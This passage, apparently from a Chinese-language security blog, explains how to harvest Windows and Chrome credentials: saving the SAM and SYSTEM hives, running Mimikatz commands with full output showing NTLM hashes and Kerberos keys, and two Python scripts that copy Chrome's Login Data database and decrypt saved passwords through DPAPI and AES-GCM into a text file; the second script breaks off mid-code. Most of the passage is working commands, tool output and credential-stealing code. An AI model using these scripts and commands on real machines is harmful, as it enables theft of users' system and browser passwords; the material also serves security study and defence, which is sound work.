class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure><p>然后通过🥝进行解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><p>解密后的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\ascotbe&gt; cd .\Desktop\</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SAM SAM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; .\x64.exe</span><br><span class="line"></span><br><span class="line">  .#####.   EeLrXMiD 2.2.0 (x64) #19041 Oct 10 2020 14:46:27</span><br><span class="line"> .## ^ ##.  &quot;e2G6OxuvUXNR1&#x27;Amour&quot; - (IcaHL)</span><br><span class="line"> ## / \ ##  /*** ST1KQSnf huXMA `gVhmWw70VD` ( NceCVtrwTckaqiPu3XOVsQl )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gVhmWw70VD.com/EeLrXMiD</span><br><span class="line"> &#x27;## v ##&#x27;       Hp6bmVPNVLO9i7B             ( FiLGZos4eo99IXHOADBc44Ir )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://ljrq4GxgPj6NY7 / https://A35s5WaTWwdjV2m6 ***/</span><br><span class="line"></span><br><span class="line">EeLrXMiD # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">EeLrXMiD # lsadump::sam /sam:SAM /system:SYSTEM</span><br><span class="line">Domain : 樱岛麻衣</span><br><span class="line">SysKey : 42939b566ede597c3284d1bd23b15a97</span><br><span class="line">Local SID : S-1-5-21-1645164750-2672341361-3879437546</span><br><span class="line"></span><br><span class="line">SAMKey : b58a3643feb8148887485d5b702aaf3f</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 900fff43b7507160b3e239892c034c22</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 8185175d7c176c6decf21cbfbde54df0a4b86cca948bb660091d2a873073b26b</span><br><span class="line">      aes128_hmac       (4096) : ce32484a789bb52f0e43fa09ddac2bf0</span><br><span class="line">      des_cbc_md5       (4096) : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 4c5c287f286dce27cdd13c6b221979df</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 38ab6a222bbf783640bdcbb714227d57</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : c60e0605a0f960188d252efb376231de1e1fb3c2fbfd66cbc4a528d364a37bfc</span><br><span class="line">      aes128_hmac       (4096) : fb6b091efaa644e306673fcd565ce4f4</span><br><span class="line">      des_cbc_md5       (4096) : a1648949c202689e</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a1648949c202689e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 42d6e016527f7bce204d94cc40baa99a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 35c0a798a120c3b112bcdb7636b8dd3e3b12284c0e85a5b1c93bfbe9c4b83c02</span><br><span class="line">      aes128_hmac       (4096) : 12a06f6bb5ff719a314ddfe96c83c69e</span><br><span class="line">      des_cbc_md5       (4096) : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EeLrXMiD #</span><br></pre></td></tr></table></figure><p>我们只需要查看最后一个<strong>ascotbe</strong>（我本机这个是管理员用户）这个账户的Hash NTLM即可知道本机密码了，通过网站解密</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/7.png" alt="image-20210610150310107"></p><h4 id="通过mimikatz抓取密码"><a href="#通过mimikatz抓取密码" class="headerlink" title="通过mimikatz抓取密码"></a>通过mimikatz抓取密码</h4><p>需要管理员权限执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>即可得出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">        mSv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : 樱岛麻衣</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        tsPkG :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        wDiGeST :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kErberoS :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        sSp :</span><br><span class="line">        crEdMan :</span><br><span class="line">        clOuDAp :</span><br></pre></td></tr></table></figure><h2 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h2><h3 id="Chrome浏览器数据"><a href="#Chrome浏览器数据" class="headerlink" title="Chrome浏览器数据"></a>Chrome浏览器数据</h3><p>Chrome的配置文件存放在<code>%LocalAppData%</code>目录下。如果有两个Google Chrome账号那么每个账号会有不同的配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default （第一个配置文件的名称）</span><br><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Profile 2 （后续的配置文件以迭代数字方式命名）</span><br></pre></td></tr></table></figure><p>目录中的<code>Login Data</code>是SQLite 3数据库文件，里面存放了各种网站和账号等信息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/8.png" alt="image-20210609143728350"></p><p>我们只需要关注logins这张表即可</p><ul><li>origin_url:登录网址</li><li>username_value:用户名</li><li>password_value:被加密的用户密码</li></ul><blockquote><p>chrome version 80（80.0.3987.163） 版本前</p></blockquote><p>chrome80以前的版本是直接可以通过DPAPI中的解密函数 CryptUnprotectData来进行解密的。</p><p>测试版本：<a href="https://dl.google.com/release2/chrome/XASj0J0BUKotBRR0eLPLxw_79.0.3945.88/79.0.3945.88_chrome_installer.exe">chrome 79.0.3945.88</a></p><h4 id="A用户解A的chrome密码"><a href="#A用户解A的chrome密码" class="headerlink" title="A用户解A的chrome密码"></a>A用户解A的chrome密码</h4><p>直接使用命令即可解密出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/9.png" alt="image-20210609154742793"></p><p>也可以直接使用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>],<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">0</span>)</span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %\</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>],row[<span class="number">1</span>],ret[<span class="number">1</span>].decode())</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="B用户解A的chrome密码"><a href="#B用户解A的chrome密码" class="headerlink" title="B用户解A的chrome密码"></a>B用户解A的chrome密码</h4><p>首先我们需要获取到A用户的MasterKey值，就可以解密了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\Desktop\Login Data&quot; /unprotect /masterkey:831d02bf734632f7aaa7719f5ec593111997c9aeefabe71ac4e4a963de546784662fcec40722a4656870698cff96c348a37d669131e99401e0947fa355e8fd0b</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/10.png" alt="image-20210609161248445"></p><blockquote><p>chrome version 80 （80.0.3987.163）版本后</p></blockquote><p>利用主密钥使用AES-GCM加密算法加密密码存放Login Data数据库，然后用DPAPI的加密函数CryptProtectData加密主密钥存放在Local State文件。其中Local State文件存放在如下地址（假设windows用户为admin），本质是个json文件，其中一个值os_crypt下的encrypted_key是解密需要用的被加密后的密钥。</p><p>解密流程</p><ol><li>获取local state和Login Data文件位置</li><li>获取local state中加密的key(base64编码)</li><li>数据库语句提取Login Data sqllite文件的password_value</li><li>DPAPI解密加密key</li><li>ase-gcm解密password_value</li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span 